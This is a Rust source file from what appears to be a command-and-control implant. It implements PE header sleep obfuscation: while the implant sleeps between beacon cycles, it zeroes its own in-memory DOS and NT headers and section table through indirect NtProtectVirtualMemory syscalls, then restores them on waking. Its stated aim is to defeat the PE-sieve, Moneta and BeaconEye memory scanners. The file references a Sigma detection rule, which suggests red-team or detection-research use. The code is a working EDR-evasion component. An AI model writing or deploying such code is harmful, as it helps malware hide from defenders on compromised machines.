//! PE header sleep obfuscation.
//!
//! Zeroes the first 0x1000 bytes of the implant's own PE image (DOS header
//! + NT headers + section table) while sleeping between beacon cycles.
//!
//!   Restored on wake. Defeats PE-sieve, Moneta, BeaconEye header scans.
//!
//! Safe with multi-threaded tokio: only headers zeroed, not .text.
//! Executing threads continue running from the already-loaded .text section.
//!
//! Detection: detection/sigma/stealth_pe_header_zeroing.yml.

const HEADER_SIZE: usize = 0x1000;

#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
use core::ffi::c_void;
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
use core::sync::atomic::{AtomicBool, Ordering};
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
use dinvk::winapis::NT_SUCCESS;

#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
static HEADERS_ZEROED: AtomicBool = AtomicBool::new(false);
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
static mut SAVED_HEADERS: [u8; HEADER_SIZE] = [0u8; HEADER_SIZE];

/// Get own EXE base address: first entry in PEB InMemoryOrderModuleList.
/// For EXE processes, Windows loader always inserts the EXE as the first entry.
#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn own_pe_base() -> Option<*mut u8> {
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, qword ptr gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags),
    );
    // PEB.Ldr at +0x18; InMemoryOrderModuleList.Flink at LDR+0x20
    let ldr = *(peb.add(0x18) as *const *const u8);
    let first = *(ldr.add(0x20) as *const *const u8);
    // IMO_DLLBASE_OFFSET = 0x20 (from InMemoryOrderLinks pointer, same as peb.rs)
    let base = *(first.add(0x20) as *const *const u8);
    if base.is_null() { None } else { Some(base as *mut u8) }
}

/// Zero PE headers in memory. Call before sleeping. Idempotent if already zeroed.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
#[allow(static_mut_refs)]
pub unsafe fn zero_headers() {
    if HEADERS_ZEROED.load(Ordering::SeqCst) { return; }
    let base = match own_pe_base() { Some(b) => b, None => return };
    // Verify PE magic "MZ" (0x5A4D in little-endian: 'M'=0x4D, 'Z'=0x5A) before zeroing.
    if *(base as *const u16) != 0x5A4D { return; }
    // Save original bytes.
    core::ptr::copy_nonoverlapping(base, SAVED_HEADERS.as_mut_ptr(), HEADER_SIZE);
    // Make page writable via NtProtectVirtualMemory indirect syscall (same pattern as etw.rs).
    let mut rb = base as *mut c_void;
    let mut rs: usize = HEADER_SIZE;
    let mut old: u32 = 0;
    let st = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb as *mut *mut c_void,
        &mut rs as *mut usize,
        0x40u32,  // PAGE_EXECUTE_READWRITE
        &mut old as *mut u32
    );
    if st.map(NT_SUCCESS) != Some(true) { return; }
    // Zero the header bytes.
    core::ptr::write_bytes(base, 0, HEADER_SIZE);
    // Restore page protection.
    let mut rb2 = base as *mut c_void;
    let mut rs2: usize = HEADER_SIZE;
    let mut dummy: u32 = 0;
    let _ = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb2 as *mut *mut c_void,
        &mut rs2 as *mut usize,
        old,
        &mut dummy as *mut u32
    );
    HEADERS_ZEROED.store(true, Ordering::SeqCst);
}

/// Restore PE headers in memory. Call after waking. Idempotent if not zeroed.
#[cfg(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion"))]
#[allow(static_mut_refs)]
pub unsafe fn restore_headers() {
    if !HEADERS_ZEROED.load(Ordering::SeqCst) { return; }
    let base = match own_pe_base() { Some(b) => b, None => return };
    let mut rb = base as *mut c_void;
    let mut rs: usize = HEADER_SIZE;
    let mut old: u32 = 0;
    let st = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb as *mut *mut c_void,
        &mut rs as *mut usize,
        0x40u32,
        &mut old as *mut u32
    );
    if st.map(NT_SUCCESS) != Some(true) { return; }
    core::ptr::copy_nonoverlapping(SAVED_HEADERS.as_ptr(), base, HEADER_SIZE);
    let mut rb2 = base as *mut c_void;
    let mut rs2: usize = HEADER_SIZE;
    let mut dummy: u32 = 0;
    let _ = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut rb2 as *mut *mut c_void,
        &mut rs2 as *mut usize,
        old,
        &mut dummy as *mut u32
    );
    HEADERS_ZEROED.store(false, Ordering::SeqCst);
}

// No-op stubs for non-Windows/non-stealth/non-edr-evasion builds.
#[cfg(not(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion")))]
pub unsafe fn zero_headers() {}
#[cfg(not(all(target_arch = "x86_64", target_os = "windows", feature = "edr-evasion")))]
pub unsafe fn restore_headers() {}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn header_size_covers_pe_header() {
        assert!(HEADER_SIZE >= 0x400);
    }

    #[test]
    fn compiles_on_host() {
        // Runtime behavior tested on Windows target only.
    }
}
